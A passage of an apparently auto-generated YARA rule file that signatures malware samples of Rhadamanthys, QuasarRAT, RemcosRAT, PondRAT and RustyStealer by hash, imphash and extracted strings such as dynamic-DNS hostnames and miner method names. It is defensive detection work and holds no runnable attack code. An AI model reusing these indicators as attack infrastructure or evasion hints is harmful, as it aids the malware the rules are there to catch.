      $s9 = "XZXYXX" fullword ascii /* reversed goodware string 'XXYXZX' */ /* score: '13.50'*/
      $s10 = "AYAYAY" fullword ascii /* reversed goodware string 'YAYAYA' */ /* score: '13.50'*/
      $s11 = ".bWM:\\" fullword ascii /* score: '10.00'*/
      $s12 = "ZYXYXZYYYY" fullword ascii /* score: '9.50'*/
      $s13 = "RXXZYYYY" fullword ascii /* score: '9.50'*/
      $s14 = "XZZYYYYZ" fullword ascii /* score: '9.50'*/
      $s15 = "ZYXXYYYYXXY" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__4fca90f2 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_4fca90f2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4fca90f2f98ba6bc1004ec582e0a0d96cf55b8905ced2578f0730ff9eaac9fe0"
   strings:
      $s1 = "cmake.exe" fullword wide /* score: '22.00'*/
      $s2 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s3 = "ZZZYYXYX" fullword ascii /* reversed goodware string 'XYXYYZZZ' */ /* score: '16.50'*/
      $s4 = "YYXZZZXZZ" fullword ascii /* base64 encoded string 'avYevY' */ /* score: '16.50'*/
      $s5 = "XYZZZY" fullword ascii /* reversed goodware string 'YZZZYX' */ /* score: '13.50'*/
      $s6 = "XXYXYY" fullword ascii /* reversed goodware string 'YYXYXX' */ /* score: '13.50'*/
      $s7 = "YXYXYX" fullword ascii /* reversed goodware string 'XYXYXY' */ /* score: '13.50'*/
      $s8 = "XXYXYZ" fullword ascii /* reversed goodware string 'ZYXYXX' */ /* score: '13.50'*/
      $s9 = "YYYYYXYZY" fullword ascii /* score: '9.50'*/
      $s10 = "XZYYYYY" fullword ascii /* score: '9.50'*/
      $s11 = "YZYYYYZXY" fullword ascii /* score: '9.50'*/
      $s12 = "PYYYYXZ" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYXYZ" fullword ascii /* score: '9.50'*/
      $s14 = "XXYXYYYY" fullword ascii /* score: '9.50'*/
      $s15 = "YYYYYYZZX" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_0 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d59db9f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b31e670.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb97b31c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0059138.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c88a4db8d0190a82df1edc21e226e5d481f7965b49387af6082bcf900f1b2b8"
      hash2 = "2d59db9fed703dc46e968e99ab95ff572fb8940c9d00c304ac58c512f37591ef"
      hash3 = "3b31e67097313350e8787223555ada0708a6b3bf86d0c8606c61d350954f62d6"
      hash4 = "eb97b31cf676ed7549a3f1e82bf546934f0509840c496e7eeccf428de1e93138"
      hash5 = "f00591384ec47004189f26bd3766220e991c70987e0c130331a32c38e3411584"
   strings:
      $s1 = "error processing extended key usage extension" fullword wide /* score: '25.00'*/
      $s2 = "Private key passed - public key expected." fullword wide /* score: '24.00'*/
      $s3 = "Public key passed - private key expected" fullword wide /* score: '24.00'*/
      $s4 = "attempt to process message to long for cipher" fullword wide /* score: '24.00'*/
      $s5 = "Key length invalid. Key needs to be 32 byte - 256 bit!!!" fullword wide /* score: '24.00'*/
      $s6 = "PublicKeyEncryptedSession" fullword ascii /* score: '23.00'*/
      $s7 = "unable to process key - " fullword wide /* score: '23.00'*/
      $s8 = "PKCS12 key store MAC invalid - wrong password or corrupted file." fullword wide /* score: '23.00'*/
      $s9 = "Validation already attempted for round 1 payload for " fullword wide /* score: '23.00'*/
      $s10 = "Validation already attempted for round 2 payload for " fullword wide /* score: '23.00'*/
      $s11 = "Validation already attempted for round 3 payload for " fullword wide /* score: '23.00'*/
      $s12 = "get_KeyEncryptionAlgorithmID" fullword ascii /* score: '22.00'*/
      $s13 = "get_KeyEncryptionAlgOid" fullword ascii /* score: '22.00'*/
      $s14 = "GetKeyEncryptionOID" fullword ascii /* score: '22.00'*/
      $s15 = "GetAuthEncryptedContentInfo" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__87a63f644cb8a20014ebd30c4ceb01d5_imphash__Rhadamanthys_signature__be86738a23c271515336a1510dc6f59d__1 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash).dll, Rhadamanthys(signature)_be86738a23c271515336a1510dc6f59d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "de9c07923c1e57c3c523277409a430939715f3508beba4436965c8146170df2b"
      hash2 = "a1ba406290af9e2e686894b43499779d6b4f436dd89f5a1f19907845f8ef69e8"
   strings:
      $x1 = "C:\\Users\\qt\\work\\qt\\qtbase\\lib\\Qt5Core.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "githubusercontent.com" fullword ascii /* score: '29.00'*/
      $s3 = "lpusercontent.com" fullword ascii /* score: '29.00'*/
      $s4 = "QProcess: custom environment will be ignored for detached elevated process." fullword ascii /* score: '27.00'*/
      $s5 = "QProcess: file redirection is unsupported for detached elevated processes." fullword ascii /* score: '27.00'*/
      $s6 = "blogsyte.com" fullword ascii /* score: '26.00'*/
      $s7 = "myiphost.com" fullword ascii /* score: '26.00'*/
      $s8 = "serveftp.com" fullword ascii /* score: '26.00'*/
      $s9 = "serveirc.com" fullword ascii /* score: '26.00'*/
      $s10 = "logoip.com" fullword ascii /* score: '26.00'*/
      $s11 = "nfshost.com" fullword ascii /* score: '26.00'*/
      $s12 = "QProcess: ConnectNamedPipe failed." fullword ascii /* score: '26.00'*/
      $s13 = "Aborted. Incompatible processor: missing feature 0x%llx -%s." fullword ascii /* score: '25.00'*/
      $s14 = "servehttp.com" fullword ascii /* score: '24.00'*/
      $s15 = "publishproxy.com" fullword ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__01916ef7_Rhadamanthys_signature__ae9484be27b196745e2c08ee4e8427ca_imphash__2 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash2 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $x1 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x2 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x3 = "System.ComponentModel.Design.IRootDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x4 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x5 = "get_ProcessName.StartWithShellExecuteEx8GetShowWindowFromWindowStyle" fullword ascii /* score: '31.00'*/
      $s6 = "<System.Diagnostics.Process.dll@System.ComponentModel.Primitives" fullword ascii /* score: '30.00'*/
      $s7 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s8 = "0MicrosoftEdgeUpdater.dll4System.Diagnostics.Process" fullword ascii /* score: '27.00'*/
      $s9 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a,DeserializationTracker,SerializationException*" ascii /* score: '27.00'*/
      $s10 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s11 = "StopMiner6AnalyzeExecutionEnvironment2SimulateEdgeUpdateProcess,ExtractMinerExecutable" fullword ascii /* score: '24.00'*/
      $s12 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a,DeserializationTracker,SerializationException*" ascii /* score: '23.00'*/
      $s13 = ",System.ObjectModel.dll" fullword ascii /* score: '23.00'*/
      $s14 = "mMKeyForXmrigEncryption2025SystemMKeyForXmrigEncryption2025SystemMKeyForXmrigEncryption2025SystemMKeyForXmrigEncryption2025Syste" ascii /* score: '22.00'*/
      $s15 = "System.dll:System.Collections.Concurrent" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and pe.imphash() == "ae9484be27b196745e2c08ee4e8427ca" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _PondRAT_signature__POOLRAT_signature__3 {
   meta:
      description = "_subset_batch - from files PondRAT(signature).elf, POOLRAT(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "973f7939ea03fd2c9663dafc21bb968f56ed1b9a56b0284acf73c3ee141c053c"
      hash2 = "85045d9898d28c9cdc4ed0ca5d76eceb457d741c5ca84bb753dde1bea980b516"
   strings:
      $s1 = "pthread_mutex_lock@@GLIBC_2.2.5" fullword ascii /* score: '18.00'*/
      $s2 = "pthread_mutex_init@@GLIBC_2.2.5" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_destroy@@GLIBC_2.2.5" fullword ascii /* score: '18.00'*/
      $s4 = "pthread_mutex_unlock@@GLIBC_2.2.5" fullword ascii /* score: '18.00'*/
      $s5 = "No more connections allowed to host %s: %zu" fullword ascii /* score: '17.50'*/
      $s6 = "dump_value_LHASH_DOALL_ARG" fullword ascii /* score: '17.00'*/
      $s7 = "EVP_PKEY_meth_get_encrypt" fullword ascii /* score: '17.00'*/
      $s8 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s9 = "RESOLVE %s:%d is - old addresses discarded!" fullword ascii /* score: '16.50'*/
      $s10 = "Content-Range: bytes %s%ld/%ld" fullword ascii /* score: '16.00'*/
      $s11 = "ssl_cipher_process_rulestr" fullword ascii /* score: '15.00'*/
      $s12 = "dtls1_process_record" fullword ascii /* score: '15.00'*/
      $s13 = "hwcrhk_mutex_init" fullword ascii /* score: '15.00'*/
      $s14 = "dtls1_preprocess_fragment" fullword ascii /* score: '15.00'*/
      $s15 = "publicKeyExtract" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__4b87c9e6_RemcosRAT_signature__4cb48bf0_4 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_4b87c9e6.js, RemcosRAT(signature)_4cb48bf0.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4b87c9e69b5afb110449461aa7b3b03d3bf46f28752552ae9a75f90c26f413a9"
      hash2 = "4cb48bf097a05911e6942942b97fe14bf07e6caeafe179687e38c70cbc8887e7"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                               ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                          ' */ /* score: '26.50'*/
      $s6 = "Zm9BAGtlcm5lbDMyLmRsbAAAAABsc3RyY3B5QQAAAABXcml0ZVByb2Nlc3NNZW1vcnkAAAAAV3JpdGVGaWxlAAAAV2FpdEZvclNpbmdsZU9iamVjdAAAAFZpcnR1YWxR" ascii /* base64 encoded string 'foA kernel32.dll    lstrcpyA    WriteProcessMemory    WriteFile   WaitForSingleObject   VirtualQ' */ /* score: '21.00'*/
      $s7 = "Z0EAAAAAR2V0TWVudVN0YXRlAAAAAEdldE1lbnVJdGVtSW5mb0EAAAAAR2V0TWVudUl0ZW1JRAAAAEdldE1lbnVJdGVtQ291bnQAAAAAR2V0TWVudQAAAEdldExhc3RB" ascii /* base64 encoded string 'gA    GetMenuState    GetMenuItemInfoA    GetMenuItemID   GetMenuItemCount    GetMenu   GetLastA' */ /* score: '21.00'*/
      $s8 = "AABSZW1vdmVNZW51AAAAAFJlbGVhc2VEQwAAAFJlbGVhc2VDYXB0dXJlAAAAAFJlZ2lzdGVyV2luZG93TWVzc2FnZUEAAAAAUmVnaXN0ZXJDbGlwYm9hcmRGb3JtYXRB" ascii /* base64 encoded string '  RemoveMenu    ReleaseDC   ReleaseCapture    RegisterWindowMessageA    RegisterClipboardFormatA' */ /* score: '21.00'*/
      $s9 = "AABFbmFibGVTY3JvbGxCYXIAAABFbmFibGVNZW51SXRlbQAAAABEcmF3VGV4dEEAAABEcmF3TWVudUJhcgAAAERyYXdJY29uRXgAAAAARHJhd0ljb24AAAAARHJhd0Zy" ascii /* base64 encoded string '  EnableScrollBar   EnableMenuItem    DrawTextA   DrawMenuBar   DrawIconEx    DrawIcon    DrawFr' */ /* score: '21.00'*/
      $s10 = "AABEZXN0cm95TWVudQAAAERlc3Ryb3lJY29uAAAARGVzdHJveUN1cnNvcgAAAERlbGV0ZU1lbnUAAAAARGVmV2luZG93UHJvY0EAAAAARGVmTURJQ2hpbGRQcm9jQQAA" ascii /* base64 encoded string '  DestroyMenu   DestroyIcon   DestroyCursor   DeleteMenu    DefWindowProcA    DefMDIChildProcA  ' */ /* score: '21.00'*/
      $s11 = "R2V0TW9kdWxlRmlsZU5hbWVBAAAAAEdldExvY2FsZUluZm9BAAAAAEdldENvbW1hbmRMaW5lQQAAAEZyZWVMaWJyYXJ5AAAARmluZEZpcnN0RmlsZUEAAAAARmluZENs" ascii /* base64 encoded string 'GetModuleFileNameA    GetLocaleInfoA    GetCommandLineA   FreeLibrary   FindFirstFileA    FindCl' */ /* score: '21.00'*/
      $s12 = "YWRMaWJyYXJ5QQAAAABMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAAABJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAAAAR2xvYmFsRmluZEF0b21BAAAAR2xvYmFsRGVsZXRl" ascii /* base64 encoded string 'adLibraryA    LeaveCriticalSection    InitializeCriticalSection   GlobalFindAtomA   GlobalDelete' */ /* score: '21.00'*/
      $s13 = "AAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '       0                               4                               8                       ' */ /* score: '21.00'*/
      $s14 = "dWVyeQAAAABWaXJ0dWFsQWxsb2MAAAAAU2l6ZW9mUmVzb3VyY2UAAAAAU2V0VGhyZWFkTG9jYWxlAAAAU2V0RmlsZVBvaW50ZXIAAAAAU2V0RXZlbnQAAAAAU2V0RXJy" ascii /* base64 encoded string 'uery    VirtualAlloc    SizeofResource    SetThreadLocale   SetFilePointer    SetEvent    SetErr' */ /* score: '21.00'*/
      $s15 = "dFRleHRDb2xvcgAAAABTZXRTdHJldGNoQmx0TW9kZQAAAFNldFJPUDIAAABTZXRQaXhlbAAAAABTZXRFbmhNZXRhRmlsZUJpdHMAAAAAU2V0RElCQ29sb3JUYWJsZQAA" ascii /* base64 encoded string 'tTextColor    SetStretchBltMode   SetROP2   SetPixel    SetEnhMetaFileBits    SetDIBColorTable  ' */ /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PDQConnect_signature__PDQConnect_signature__034b202c_PDQConnect_signature__0e8469dd_PDQConnect_signature__2feb6905_PDQConne_5 {
   meta:
      description = "_subset_batch - from files PDQConnect(signature).msi, PDQConnect(signature)_034b202c.msi, PDQConnect(signature)_0e8469dd.msi, PDQConnect(signature)_2feb6905.msi, PDQConnect(signature)_362aa6b0.msi, PDQConnect(signature)_4b6f0197.msi, PDQConnect(signature)_7b7fcfa3.msi, PDQConnect(signature)_7f6dad75.msi, PDQConnect(signature)_821d2c62.msi, PDQConnect(signature)_8e9f898c.msi, PDQConnect(signature)_b2011d6e.msi, PDQConnect(signature)_da0e4be3.msi, PDQConnect(signature)_eabaddc7.msi, PDQConnect(signature)_fa76da7d.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9c8d6f1ee1180ae2f6982582980b67ad4fe2a20fc8b45308975d1e31c7f99191"
      hash2 = "034b202cf33146a9037957e3165b4921384727a70006b6abf385b9506de8ad06"
      hash3 = "0e8469dd70f63dc392676f862d2c02c24e7d53aa2cff42fe471eaaa0c17eecf8"
      hash4 = "2feb6905303bee7478366f382b23ea272fd44833d7a7ab3ebc3312a381bc4fb0"
      hash5 = "362aa6b01f3cd9296e70980b1d93ba39de7ee4749b4885a7f6a8d87ad5d1ff33"
      hash6 = "4b6f01972a90e8e7bc39e4d5cf9a88fb93adcb3daae39be45975e2b1089a1552"
      hash7 = "7b7fcfa3f52d6582e6dd278f2079c3158906529db5407e648e8990f095a05383"
      hash8 = "7f6dad75615565376cb447044fc93c9a9975d0e94a28a2042cbcb03f90a3accb"
      hash9 = "821d2c62055f6164560a7edeaf7e67d240f050fb112cddf25725838a3e28c037"
      hash10 = "8e9f898c5baac69c96da4accccae6df725a1e88ca23f5dc59f03496778442671"
      hash11 = "b2011d6e78c449de79b9302fd3417b0053fe0a5359b2b733dfedb0451da2d3d7"
      hash12 = "da0e4be31458c29e7c4af566c2ffe2882b69379c3144a8d71a42ad6e44a0ed61"
      hash13 = "eabaddc7d4d37284ddb8c3a764324626eca121747ed9647349c35ab19908fbd2"
      hash14 = "fa76da7d823f2f36aaec9988d52cdc7b78c9f076efcfc5d2b2c76a6141ab2822"
   strings:
      $x1 = "DependenciesStartNamePasswordArgumentsDescriptionPDQ Connect AgentLOCALSYSTEM--servicePDQ.com software deployment serviceService" ascii /* score: '34.00'*/
      $s2 = "SizeVersionLanguageAttributesSequence05.9.1.0p-lw7ji3.exe|pdq-connect-agent.exeComponent.pdqconnectagentpdqconnectagent8e1yztmz." ascii /* score: '30.00'*/
      $s3 = "irPDQtlmcolwe|PDQConnectAgentProgramFiles64Folderiqrp47ah|Downloadsgbexn3uq|PDQConnectAgentCommonAppDataFolderTARGETDIRPFiles64S" ascii /* score: '27.00'*/
      $s4 = "nceValidateProductIDInstallExecuteSequenceVersionNTNOT UPGRADINGPRODUCTCODEMsiConfigureServicesVersionNT>=600 (1) (NOT UPGRADING" ascii /* score: '27.00'*/
      $s5 = " to run if failure action is RUN_COMMAND.Message to show to users when rebooting if failure action is REBOOT.Internal Name of th" ascii /* score: '26.00'*/
      $s6 = " progress dialog and log when action is executing.Optional localized format template used to format action data records for disp" ascii /* score: '23.00'*/
      $s7 = "lation option, one of iimEnum.Primary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or ico" ascii /* score: '22.00'*/
      $s8 = "t be determined.Error attempting to read from the source install database: [2].Scheduling reboot operation: Renaming file [2] to" ascii /* score: '22.00'*/
      $s9 = "reset the failure count for the service.Period after which to restart the service after a given failure.Command line for program" ascii /* score: '22.00'*/
      $s10 = "ssfully.Installation failed.Product: [2] -- [3]You may either restore your computer to its previous state or continue the instal" ascii /* score: '21.00'*/
      $s11 = ". Verify that you have sufficient privileges to modify the security permissions for this file.Component Services (COM+ 1.0) are " ascii /* score: '21.00'*/
      $s12 = "unregistering COM+ Application. Contact your support personnel for more information.The description for service '[2]' ([3]) coul" ascii /* score: '21.00'*/
      $s13 = "bute flags to be applied.Permissions to grant to UserForeign key into the Component table used to determine install statePrimary" ascii /* score: '20.00'*/
      $s14 = "ith this Windows Installer package. A DLL required for this install to complete could not be run. Contact your support personnel" ascii /* score: '20.00'*/
      $s15 = "4ServiceConfigServiceNameNewServiceFirstFailureActionTypeSecondFailureActionTypeThirdFailureActionTypeResetPeriodInDaysRestartSe" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__RustyStealer_signature__3cd64360_RustyStealer_signature__75d13124_6 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature).msi, RustyStealer(signature)_3cd64360.msi, RustyStealer(signature)_75d13124.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "136a6b11b37e77af53a1248e099999cbbb4530fafe17d2cc157c75d3b639546e"
      hash2 = "3cd643601fa45658b21139debe530883524d53d2923554a4b547dd531d019b30"
      hash3 = "75d131243082e546c1083b3876c84c71251fa483fc5b098765d643ab71ed82df"
   strings:
      $x1 = "upDependenciesStartNamePasswordArgumentsDescriptionPDQ Connect AgentLOCALSYSTEM--servicePDQ.com software deployment serviceServi" ascii /* score: '34.00'*/
      $s2 = "eSizeVersionLanguageAttributesSequence05.8.23.0p-lw7ji3.exe|pdq-connect-agent.exeComponent.pdqconnectagentpdqconnectagent8e1yztm" ascii /* score: '30.00'*/
      $s3 = "uenceValidateProductIDInstallExecuteSequenceVersionNTNOT UPGRADINGPRODUCTCODEMsiConfigureServicesVersionNT>=600 (1) (NOT UPGRADI" ascii /* score: '27.00'*/
      $s4 = "tDirPDQtlmcolwe|PDQConnectAgentProgramFiles64Folderiqrp47ah|Downloadsgbexn3uq|PDQConnectAgentCommonAppDataFolderTARGETDIRPFiles6" ascii /* score: '27.00'*/
      $s5 = "am to run if failure action is RUN_COMMAND.Message to show to users when rebooting if failure action is REBOOT.Internal Name of " ascii /* score: '26.00'*/
      $s6 = "in progress dialog and log when action is executing.Optional localized format template used to format action data records for di" ascii /* score: '23.00'*/
      $s7 = "o reset the failure count for the service.Period after which to restart the service after a given failure.Command line for progr" ascii /* score: '22.00'*/
      $s8 = "allation option, one of iimEnum.Primary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or i" ascii /* score: '22.00'*/
      $s9 = "not be determined.Error attempting to read from the source install database: [2].Scheduling reboot operation: Renaming file [2] " ascii /* score: '22.00'*/
      $s10 = ".Error formatting template, obtained from user ed. or localizers.Name of action to be described.Localized description displayed " ascii /* score: '22.00'*/
      $s11 = "r unregistering COM+ Application. Contact your support personnel for more information.The description for service '[2]' ([3]) co" ascii /* score: '21.00'*/
      $s12 = "2]. Verify that you have sufficient privileges to modify the security permissions for this file.Component Services (COM+ 1.0) ar" ascii /* score: '21.00'*/
      $s13 = "cessfully.Installation failed.Product: [2] -- [3]You may either restore your computer to its previous state or continue the inst" ascii /* score: '21.00'*/
      $s14 = "ix4ServiceConfigServiceNameNewServiceFirstFailureActionTypeSecondFailureActionTypeThirdFailureActionTypeResetPeriodInDaysRestart" ascii /* score: '20.00'*/
      $s15 = " with this Windows Installer package. A DLL required for this install to complete could not be run. Contact your support personn" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__11b5e5a8c80fad621ae3668e21759e30_imphash__Rhadamanthys_signature__11b5e5a8c80fad621ae3668e21759e30__7 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_11b5e5a8c80fad621ae3668e21759e30(imphash).exe, Rhadamanthys(signature)_11b5e5a8c80fad621ae3668e21759e30(imphash)_cbad17a4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "860d1c2cbbe105f7084fbc4c0804b8733ff20cf65d38535739e35a5b01e684ca"
      hash2 = "cbad17a4839fd60dd1edeb09bb3b411c22bb1cb8fbc8b89ac814a81ca5cb6178"
   strings:
      $s1 = "# K-.N_TG y~.K X\\.UZD].E q D.l.P.1iTyu ofSsU{ C z.4.v.t- U_I_g.7: t_jv.l e.V_L t z F S b.JUjC " fullword ascii /* score: '15.00'*/
      $s2 = "P n Q p k Q vU i3D.s_uw.AC@o+ S{ YR8D G_VQMQ.G_l L?L_Tc_o u.C_qTX.g.iU.Vuu.s" fullword ascii /* score: '11.00'*/
      $s3 = " kSm x.eU X.Tl A_v.Z_v.y.nal k* TUxN_X_b_N4_q.N8.r_J~_vL.b_SA_bV4" fullword ascii /* score: '11.00'*/
      $s4 = " g.Pw A^.JEm kK~\\_De.V`_HPu.C_R} qiq.0.8.O.W_MvTT.0.8G.M vq_XHj.w- K.h_y.CN_ei.4|-" fullword ascii /* score: '11.00'*/
      $s5 = "A.g+u.6*.L_CZiT.Sj g Tk.zH1=),.C_G i+;y.F_c* k_kU Sl Q z2_M.Ne.FCl.Fh v_r.l" fullword ascii /* score: '11.00'*/
      $s6 = "eh_p=.V F.ke.j#_i\\.mdE.w_TV_mNNL Y.2_yu g?.6 f b_J.D.P gV+ E.R i W,>_U>N) d.mC dE7" fullword ascii /* score: '11.00'*/
      $s7 = "_q!.K_N D b.5k.y/S.0_V w Y.Q.BK RCSO** c.h_c-.PeX_Vl y S/;y.U.cw.Wru+_b.cV_w ny_tV_e XM.W#_S_X" fullword ascii /* score: '11.00'*/
      $s8 = "$NM.i%.I.U1.h B z_g.G_H.kvq.Q_W h:} VE u qV+ Iff G Af em_HEEv&_x_b@c.A9_G v.X1-.V h.0_j.T_f_h" fullword ascii /* score: '11.00'*/
      $s9 = "]:_V_G_t.x.v zX* R.s.K| L.izz.UWC_l_y_Gv7.U y_H_f.c} C_L DF$.P w_sumK A T.T.r.W.C.E_n.y" fullword ascii /* score: '11.00'*/
      $s10 = "XP+_T.Gs!7_D_t C.a c L>.0~ r.Y_v.a.S.Hi_D.b PU_XZDX/$[%I_A.P_mew T l j.r H* w b.Z.P B_W_T " fullword ascii /* score: '11.00'*/
      $s11 = "R f_B$.atj:\\C0_b WV_P:.9_b HK_b_X_r3" fullword ascii /* score: '10.00'*/
      $s12 = "t:\\.6 Q.W_e.h.DXp nd.r.f{ J.hH.G hCm!.Y.o.7.f Ai.n(.w_xr_c4.e.2.eU j.j k_E&&_J>-q." fullword ascii /* score: '10.00'*/
      $s13 = "* K.IL_W^;4_W A.T.gB.J.s b.Z ZZd RK.W.M.R Y&{.3^_b m.z.V_Q_V_u a" fullword ascii /* score: '9.00'*/
      $s14 = "}.u.4{.zqj.H_b r;_k K_W_X D.R T f.x.5.g TM r_R.o.2 C L u I S.6 k,_nr.O9.d_I.M h6_P_v.SpY" fullword ascii /* score: '9.00'*/
      $s15 = " S TiRC.8.X_c:_D_l_QR= p A@.w.rT_km_A" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "11b5e5a8c80fad621ae3668e21759e30" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__96620b4583109e432b518b4c8a70a644_imphash__Rhadamanthys_signature__ec3d957328218923409f8c8e3b66a95b__8 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_96620b4583109e432b518b4c8a70a644(imphash).exe, Rhadamanthys(signature)_ec3d957328218923409f8c8e3b66a95b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "55c3a3fdfe1e890d055ade7d6bbeeb83f04bbbc46aeab5cd9c8550cf67a659db"
      hash2 = "1e3a9183d9ac669b2c877fa746b31d1c292324027d9679f95799679e5e13dc1d"
   strings:
      $s1 = ".get] j_Q_Q_e.VH-OwpV T.G.z.Vk_f.x T b B_b* K E_cZ.G_FK B" fullword ascii /* score: '16.00'*/
      $s2 = "* Z/_K.H_Vb.hil.i.w8_u Lm0 z.t.2_dr C.5_" fullword ascii /* score: '12.00'*/
